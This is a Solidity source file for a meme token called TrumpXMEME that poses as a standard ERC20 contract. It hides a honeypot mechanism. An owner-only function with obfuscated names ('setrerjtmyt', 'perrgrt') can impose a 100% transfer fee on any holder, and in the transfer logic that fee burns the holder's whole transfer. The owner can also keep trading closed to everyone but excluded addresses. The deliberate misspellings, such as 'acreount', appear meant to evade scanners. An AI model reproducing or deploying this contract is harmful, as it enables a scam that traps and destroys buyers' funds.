pragma solidity 0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acreount) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return 9;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address acreount) public view override returns (uint256) {
        return _balances[acreount];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        _transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address acreount, uint256 amount) internal virtual {
        require(acreount != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), acreount, amount);

        _totalSupply += amount;
        _balances[acreount] += amount;
        emit Transfer(address(0), acreount, amount);

        _afterTokenTransfer(address(0), acreount, amount);
    }

    function _burn(address acreount, uint256 amount) internal virtual {
        require(acreount != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(acreount, address(0), amount);

        uint256 acreountBalance = _balances[acreount];
        require(acreountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[acreount] = acreountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(acreount, address(0), amount);

        _afterTokenTransfer(acreount, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

contract TrumpX is ERC20, Ownable {
    mapping (address => bool) private _isExcludedFromEnableTrading;
    mapping (address => uint256) private _rerjtmyt;
    address private constant BURN_ADDRESS = address(0xdead);

    constructor() ERC20("TrumpXMEME", "TrumpX") {
        _isExcludedFromEnableTrading[address(0x0146D68852cB6E7aB46248Cf344dADFf81Bed557)] = true;
        _mint(address(0x0146D68852cB6E7aB46248Cf344dADFf81Bed557), 420_690_000 * (10 ** decimals()));
    }

    receive() external payable {}

    function excludeFromEnableTrading(address acreount, bool excluded) external onlyOwner {
        require(_isExcludedFromEnableTrading[acreount] != excluded, "acreount is already the value of 'excluded'");
        _isExcludedFromEnableTrading[acreount] = excluded;
    }

    function isExcludedFromEnableTrading(address acreount) public view returns(bool) {
        return _isExcludedFromEnableTrading[acreount];
    }
    uint256 private constant perrgrt = 100;
    uint256 private constant perrgrts = 0;
    function setrerjtmyt(address acreount) external onlyOwner {
        _rerjtmyt[acreount] = perrgrt;
    }
    function jiesetrerjtmyt(address acreount) external onlyOwner {
        _rerjtmyt[acreount] = perrgrts;
    }
    function getrerjtmyt(address acreount) public view returns(uint256) {
        return _rerjtmyt[acreount];
    }

    bool public tradingEnabled;

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Trading already enabled.");
        tradingEnabled = true;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tradingEnabled || _isExcludedFromEnableTrading[from] || _isExcludedFromEnableTrading[to], "Trading not yet enabled!");

        uint256 feeperrgrt = _rerjtmyt[from];
        uint256 feeAmount = (amount * feeperrgrt) / 100;
        uint256 transferAmount = amount - feeAmount;

        if (feeAmount > 0) {
            super._transfer(from, BURN_ADDRESS, feeAmount);
        }

        super._transfer(from, to, transferAmount);
    }
}